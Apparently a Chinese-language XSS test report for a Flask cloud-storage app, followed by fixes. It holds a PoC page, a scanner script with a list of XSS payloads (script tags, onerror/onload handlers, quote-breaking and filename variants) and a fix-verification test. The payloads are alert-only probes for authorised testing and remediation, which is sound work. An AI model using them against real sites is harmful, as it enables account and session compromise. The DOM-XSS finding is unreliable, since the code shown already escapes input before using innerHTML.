# XSS漏洞验证PoC代码

## 1. 高危漏洞 - DOM型XSS PoC

### 1.1 手动验证步骤

```html
<!-- PoC.html - 将此代码保存为HTML文件并在浏览器中打开 -->
<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - highlightSearchMatches</title>
    <style>
        .search-hit { background-color: yellow; font-weight: bold; }
    </style>
</head>
<body>
    <h1>DOM型XSS漏洞验证</h1>
    
    <!-- 模拟搜索结果容器 -->
    <div id="searchResultsContainer">
        <a href="#" class="search-match-target">testdocument.pdf</a>
        <a href="#" class="search-match-target">myfolder</a>
    </div>
    
    <script>
        // 漏洞代码复现 (来自files-index.js)
        function escapeHtml(value) {
            return value
                .replaceAll("&", "&amp;")
                .replaceAll("<", "&lt;")
                .replaceAll(">", "&gt;")
                .replaceAll('"', "&quot;")
                .replaceAll("'", "&#39;");
        }

        function highlightSearchMatches_VULNERABLE(query) {
            const container = document.getElementById("searchResultsContainer");
            const normalizedQuery = query.trim().toLowerCase();
            if (!normalizedQuery) return;

            container.querySelectorAll(".search-match-target").forEach((element) => {
                const originalText = element.textContent || "";
                const matchIndex = originalText.toLowerCase().indexOf(normalizedQuery);
                if (matchIndex === -1) return;

                const start = escapeHtml(originalText.slice(0, matchIndex));
                const middle = escapeHtml(originalText.slice(matchIndex, matchIndex + normalizedQuery.length));
                const end = escapeHtml(originalText.slice(matchIndex + normalizedQuery.length));
                
                // ⚠️ 漏洞点: 使用innerHTML可能导致XSS
                element.innerHTML = `${start}<span class="search-hit">${middle}</span>${end}`;
            });
        }

        // 攻击载荷
        const maliciousQuery = "<img src=x onerror=alert('XSS_VULNERABLE!')";
        
        // 执行攻击
        console.log("正在测试XSS漏洞...");
        highlightSearchMatches_VULNERABLE(maliciousQuery);
    </script>
</body>
</html>
```

### 1.2 Python自动化测试脚本

```python
#!/usr/bin/env python3
"""
XSS漏洞自动化测试脚本
用于验证Home-Cloud-Server的XSS漏洞
"""

import requests
import sys
import time
from urllib.parse import urljoin, quote

class XSSTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = []
        
        # XSS测试载荷
        self.payloads = [
            {
                "name": "基本script标签",
                "payload": "<script>alert('XSS')</script>",
                "expected": "<script>",
                "severity": "HIGH"
            },
            {
                "name": "img onerror",
                "payload": "<img src=x onerror=alert('XSS')>",
                "expected": "onerror",
                "severity": "HIGH"
            },
            {
                "name": "svg onload",
                "payload": "<svg onload=alert('XSS')>",
                "expected": "onload",
                "severity": "HIGH"
            },
            {
                "name": "事件处理器",
                "payload": "<body onload=alert('XSS')>",
                "expected": "onload",
                "severity": "MEDIUM"
            },
            {
                "name": "javascript伪协议",
                "payload": "javascript:alert('XSS')",
                "expected": "javascript:",
                "severity": "MEDIUM"
            },
            {
                "name": "iframe",
                "payload": "<iframe src=javascript:alert('XSS')>",
                "expected": "javascript:",
                "severity": "MEDIUM"
            },
            {
                "name": "URL编码绕过",
                "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
                "expected": "onerror",
                "severity": "MEDIUM"
            },
            {
                "name": "双引号闭合",
                "payload": '"><script>alert("XSS")</script>',
                "expected": "<script>",
                "severity": "HIGH"
            },
            {
                "name": "单引号闭合",
                "payload": "'><script>alert('XSS')</script>",
                "expected": "<script>",
                "severity": "HIGH"
            },
            {
                "name": "DOM事件",
                "payload": "<input onfocus=alert('XSS') autofocus>",
                "expected": "onfocus",
                "severity": "MEDIUM"
            }
        ]
    
    def login(self, username, password):
        """登录系统"""
        login_url = urljoin(self.base_url, "/login")
        data = {
            "username": username,
            "password": password
        }
        try:
            response = self.session.post(login_url, data=data, allow_redirects=True)
            if "dashboard" in response.url or response.status_code == 200:
                print(f"[✓] 登录成功: {username}")
                return True
            else:
                print(f"[✗] 登录失败")
                return False
        except Exception as e:
            print(f"[✗] 登录错误: {e}")
            return False
    
    def test_reflected_xss_search(self):
        """测试搜索功能的反射型XSS"""
        print("\n[+] 测试搜索功能的反射型XSS...")
        search_url = urljoin(self.base_url, "/files/search")
        
        for test in self.payloads:
            try:
                params = {"query": test["payload"]}
                response = self.session.get(search_url, params=params)
                
                # 检查响应中是否包含未转义的payload
                if test["expected"] in response.text and test["payload"] not in response.text:
                    # 可能已被转义
                    continue
                    
                if test["payload"] in response.text:
                    result = {
                        "endpoint": "/files/search",
                        "parameter": "query",
                        "payload": test["payload"],
                        "name": test["name"],
                        "severity": test["severity"],
                        "status": "VULNERABLE"
                    }
                    self.results.append(result)
                    print(f"  [⚠️] 发现漏洞: {test['name']} ({test['severity']})")
                else:
                    print(f"  [✓] 安全: {test['name']}")
                    
            except Exception as e:
                print(f"  [✗] 测试错误: {e}")
            
            time.sleep(0.5)  # 避免请求过快
    
    def test_dom_xss(self):
        """测试DOM型XSS"""
        print("\n[+] 测试DOM型XSS（需要手动验证）...")
        
        # DOM型XSS需要浏览器环境，这里提供测试URL
        search_url = urljoin(self.base_url, "/files/search")
        
        dom_payloads = [
            "<img src=x onerror=console.log('DOM_XSS')",
            "<script>console.log('DOM_XSS')</script>",
            "<div onmouseover=alert('XSS')>hover me</div>"
        ]
        
        for payload in dom_payloads:
            test_url = f"{search_url}?query={quote(payload)}"
            print(f"  [→] 手动测试URL: {test_url}")
            print(f"      载荷: {payload}")
            print(f"      操作: 在浏览器中打开此URL，查看控制台是否有'DOM_XSS'输出")
            print()
    
    def test_stored_xss_filename(self):
        """测试文件名的存储型XSS"""
        print("\n[+] 测试文件名的存储型XSS...")
        
        # 注意: 这个测试需要实际上传文件
        # 这里提供测试方法和预期结果
        
        malicious_filenames = [
            "<script>alert('XSS')</script>.pdf",
            "test<img src=x onerror=alert('XSS')>.txt",
            "'><script>alert(String.fromCharCode(88,83,83))</script>.doc"
        ]
        
        print("  [i] 存储型XSS测试需要手动执行:")
        print("  1. 上传带有恶意文件名的文件")
        print("  2. 查看文件列表页面")
        print("  3. 检查是否触发XSS")
        print()
        
        for filename in malicious_filenames:
            print(f"     测试文件名: {filename}")
    
    def test_error_page_xss(self):
        """测试错误页面的XSS"""
        print("\n[+] 测试错误页面的XSS...")
        
        # 测试404错误页面
        error_urls = [
            "/files/preview/99999<script>alert(1)</script>",
            "/admin/users/edit/'><script>alert(1)</script>",
            "/files/download/99999><img src=x onerror=alert(1)>"
        ]
        
        for url_path in error_urls:
            try:
                url = urljoin(self.base_url, url_path)
                response = self.session.get(url)
                
                if "<script>alert(1)" in response.text or "onerror=alert(1)" in response.text:
                    print(f"  [⚠️] 发现漏洞: {url_path}")
                    self.results.append({
                        "endpoint": url_path,
                        "type": "Error Page XSS",
                        "status": "VULNERABLE"
                    })
                else:
                    print(f"  [✓] 安全: {url_path[:50]}...")
            except Exception as e:
                print(f"  [✗] 错误: {e}")
    
    def generate_report(self):
        """生成测试报告"""
        print("\n" + "="*60)
        print("XSS测试报告")
        print("="*60)
        
        high_risk = [r for r in self.results if r.get("severity") == "HIGH"]
        medium_risk = [r for r in self.results if r.get("severity") == "MEDIUM"]
        low_risk = [r for r in self.results if r.get("severity") == "LOW"]
        
        print(f"\n高危漏洞: {len(high_risk)}")
        print(f"中危漏洞: {len(medium_risk)}")
        print(f"低危漏洞: {len(low_risk)}")
        print(f"总计: {len(self.results)}")
        
        if self.results:
            print("\n详细结果:")
            for result in self.results:
                print(f"\n  [{result.get('severity', 'UNKNOWN')}] {result.get('name', 'Unknown')}")
                print(f"  端点: {result.get('endpoint', 'N/A')}")
                print(f"  载荷: {result.get('payload', 'N/A')[:50]}...")
        else:
            print("\n未发现明显的XSS漏洞（仍需手动验证DOM型XSS）")
        
        return self.results

def main():
    if len(sys.argv) < 4:
        print("用法: python xss_poc.py <base_url> <username> <password>")
        print("示例: python xss_poc.py http://localhost:5000 admin password123")
        sys.exit(1)
    
    base_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    
    print(f"[*] 目标URL: {base_url}")
    print(f"[*] 测试账户: {username}")
    print(f"[*] 开始XSS渗透测试...")
    
    tester = XSSTester(base_url)
    
    # 登录
    if not tester.login(username, password):
        print("[-] 无法登录，测试终止")
        sys.exit(1)
    
    # 执行测试
    tester.test_reflected_xss_search()
    tester.test_dom_xss()
    tester.test_stored_xss_filename()
    tester.test_error_page_xss()
    
    # 生成报告
    tester.generate_report()

if __name__ == "__main__":
    main()
```

### 1.3 浏览器控制台测试

```javascript
// 在浏览器开发者控制台中执行以下代码来验证漏洞

// 测试1: highlightSearchMatches函数
(function testHighlightXSS() {
    const query = "<img src=x onerror=alert('DOM_XSS_VULNERABLE')>";
    
    // 模拟搜索请求
    fetch(`/files/search?query=${encodeURIComponent(query)}`, {
        headers: {
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }
    })
    .then(r => r.json())
    .then(data => {
        // 如果返回的HTML中包含未转义的脚本，则存在漏洞
        if (data.html && data.html.includes('onerror=')) {
            console.error('[VULNERABLE] DOM XSS found in search results!');
        }
    });
})();

// 测试2: 检查innerHTML使用
(function checkInnerHTML() {
    const allScripts = document.querySelectorAll('script');
    allScripts.forEach(script => {
        if (script.textContent.includes('innerHTML')) {
            console.log('Found innerHTML usage:', script.src || 'inline');
        }
    });
})();

// 测试3: 检查dataset使用
(function checkDataset() {
    const buttons = document.querySelectorAll('button[data-file-name]');
    buttons.forEach(btn => {
        const name = btn.dataset.fileName;
        if (name && /[<>"']/.test(name)) {
            console.warn('[RISK] Potentially dangerous filename in dataset:', name);
        }
    });
})();
```

---

## 2. 修复代码

### 2.1 修复highlightSearchMatches函数

```javascript
// 修复后的代码 - files-index.js

/**
 * 安全的搜索高亮函数
 * 使用DOM API替代innerHTML，防止XSS攻击
 */
function highlightSearchMatches(query) {
    const normalizedQuery = query.trim().toLowerCase();
    if (!normalizedQuery) {
        return;
    }

    dom.searchResultsContainer.querySelectorAll(".search-match-target").forEach((element) => {
        const originalText = element.textContent || "";
        const matchIndex = originalText.toLowerCase().indexOf(normalizedQuery);
        if (matchIndex === -1) {
            return;
        }

        // 安全的方法: 使用DOM API创建元素
        element.textContent = ''; // 清空现有内容
        
        // 创建文本节点和高亮span
        if (matchIndex > 0) {
            element.appendChild(document.createTextNode(
                originalText.slice(0, matchIndex)
            ));
        }
        
        const highlightSpan = document.createElement('span');
        highlightSpan.className = 'search-hit';
        highlightSpan.textContent = originalText.slice(matchIndex, matchIndex + normalizedQuery.length);
        element.appendChild(highlightSpan);
        
        const remainingText = originalText.slice(matchIndex + normalizedQuery.length);
        if (remainingText) {
            element.appendChild(document.createTextNode(remainingText));
        }
    });
}

// 或者使用DOMPurify方案（需要引入DOMPurify库）
function highlightSearchMatchesWithDOMPurify(query) {
    const normalizedQuery = query.trim().toLowerCase();
    if (!normalizedQuery) return;

    dom.searchResultsContainer.querySelectorAll(".search-match-target").forEach((element) => {
        const originalText = element.textContent || "";
        const matchIndex = originalText.toLowerCase().indexOf(normalizedQuery);
        if (matchIndex === -1) return;

        const start = escapeHtml(originalText.slice(0, matchIndex));
        const middle = escapeHtml(originalText.slice(matchIndex, matchIndex + normalizedQuery.length));
        const end = escapeHtml(originalText.slice(matchIndex + normalizedQuery.length));
        
        const html = `${start}<span class="search-hit">${middle}</span>${end}`;
        
        // 使用DOMPurify清理HTML
        element.innerHTML = DOMPurify.sanitize(html, {
            ALLOWED_TAGS: ['span'],
            ALLOWED_ATTR: ['class']
        });
    });
}
```

### 2.2 添加DOMPurify到项目

```html
<!-- 在base.html中添加DOMPurify -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
```

### 2.3 输入验证函数

```javascript
// 输入验证工具函数
const InputValidator = {
    // 文件名验证
    isValidFilename(filename) {
        // 禁止的字符: < > " ' & \ / : * ? | 
        const invalidChars = /[<>'"&\\/:?*|]/;
        return !invalidChars.test(filename) && 
               filename.length > 0 && 
               filename.length <= 255;
    },
    
    // 文件夹名验证
    isValidFolderName(folderName) {
        return this.isValidFilename(folderName);
    },
    
    // 搜索查询验证
    isValidSearchQuery(query) {
        return query.length <= 100 && // 长度限制
               !/[<>]/.test(query);   // 禁止HTML标签字符
    },
    
    // 清理用户输入
    sanitizeInput(input) {
        if (typeof input !== 'string') return '';
        return input
            .replace(/[<>]/g, '')      // 移除尖括号
            .replace(/["']/g, '')      // 移除引号
            .replace(/&/g, '')         // 移除&符号
            .trim();
    }
};

// 在搜索提交时使用
async function submitSearchForm(event) {
    event.preventDefault();
    
    const query = dom.workspaceSearchInput?.value.trim() || "";
    
    // 验证输入
    if (!InputValidator.isValidSearchQuery(query)) {
        showErrorModal("Invalid Search", "Search query contains invalid characters.");
        return;
    }
    
    // 继续搜索逻辑...
}
```

### 2.4 Flask后端安全头

```python
# app/__init__.py

from flask import Flask, request, g
import functools

def add_security_headers(response):
    """添加安全响应头"""
    
    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; "
        "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com https://cdnjs.cloudflare.com; "
        "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; "
        "img-src 'self' data: blob:; "
        "connect-src 'self'; "
        "frame-ancestors 'none'; "
        "form-action 'self';"
    )
    
    # XSS Protection
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # Content Type Options
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # Frame Options
    response.headers['X-Frame-Options'] = 'DENY'
    
    # Referrer Policy
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    # HSTS (如果启用HTTPS)
    # response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    return response

# 在create_app函数中注册
app.after_request(add_security_headers)
```

### 2.5 文件名清理装饰器

```python
# app/utils/security.py

import re
from functools import wraps
from flask import request, flash

def sanitize_filename(filename):
    """
    清理文件名，移除危险字符
    """
    if not filename:
        return None
    
    # 移除HTML相关字符
    filename = re.sub(r'[<>">\'&]', '', filename)
    
    # 移除路径遍历字符
    filename = re.sub(r'[\\/]', '', filename)
    
    # 移除控制字符
    filename = re.sub(r'[\x00-\x1f\x7f]', '', filename)
    
    # 限制长度
    if len(filename) > 255:
        name, ext = filename[:250].rsplit('.', 1) if '.' in filename[:250] else (filename[:250], '')
        filename = f"{name}.{ext}" if ext else name
    
    return filename.strip()

def validate_filename_input(f):
    """
    装饰器: 验证文件名输入
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # 检查文件名参数
        for key in ['filename', 'folder_name', 'new_name']:
            if key in request.form:
                original = request.form[key]
                sanitized = sanitize_filename(original)
                if original != sanitized:
                    flash('Invalid characters in filename were removed', 'warning')
                request.form = request.form.copy()
                request.form[key] = sanitized
        
        return f(*args, **kwargs)
    return decorated_function
```

### 2.6 模板增强转义

```html
<!-- 在模板中使用显式转义 -->

<!-- _item_rows.html -->
<button 
    type="button" 
    class="btn btn-light btn-icon rename-folder" 
    data-folder-id="{{ folder.id }}" 
    data-folder-name="{{ folder.name|e }}"
    aria-label="Rename folder {{ folder.name|e }}">
    <i class="fas fa-pen"></i>
</button>

<!-- search.html -->
<p class="text-muted">Results for: <strong>{{ query|e }}</strong></p>
```

---

## 3. 验证修复效果

### 3.1 修复验证测试

```python
# test_xss_fix.py
import requests
import re

def test_xss_fixes(base_url):
    """验证XSS修复是否生效"""
    
    session = requests.Session()
    
    # 登录
    session.post(f"{base_url}/login", data={
        "username": "test",
        "password": "test"
    })
    
    # 测试1: 检查安全头
    response = session.get(f"{base_url}/")
    headers = response.headers
    
    checks = {
        "CSP Header": "Content-Security-Policy" in headers,
        "XSS Protection": headers.get("X-XSS-Protection") == "1; mode=block",
        "Content Type Options": headers.get("X-Content-Type-Options") == "nosniff",
        "Frame Options": headers.get("X-Frame-Options") == "DENY"
    }
    
    print("安全头检查:")
    for check, result in checks.items():
        status = "✓" if result else "✗"
        print(f"  [{status}] {check}")
    
    # 测试2: 搜索XSS防护
    xss_payload = "<script>alert('XSS')</script>"
    response = session.get(f"{base_url}/files/search", params={"query": xss_payload})
    
    # 检查payload是否被转义
    if "<script>" not in response.text and "&lt;script&gt;" in response.text:
        print("\n[✓] 搜索参数已正确转义")
    else:
        print("\n[✗] 搜索参数可能未正确转义")
    
    # 测试3: 文件名清理
    # 尝试上传带有恶意文件名的文件
    files = {
        'files': ('<script>alert(1)</script>.txt', b'test content', 'text/plain')
    }
    response = session.post(f"{base_url}/files/upload", files=files, data={"folder_id": ""})
    
    if "alert" not in response.text:
        print("[✓] 恶意文件名已被清理")
    else:
        print("[✗] 恶意文件名可能未清理")

if __name__ == "__main__":
    test_xss_fixes("http://localhost:5000")
```

---

## 4. 持续监控建议

1. **定期使用自动化扫描工具**: OWASP ZAP, Burp Suite
2. **代码审查**: 重点关注innerHTML, document.write, eval等危险函数
3. **依赖更新**: 定期更新DOMPurify等安全库
4. **安全培训**: 对开发人员进行XSS防护培训
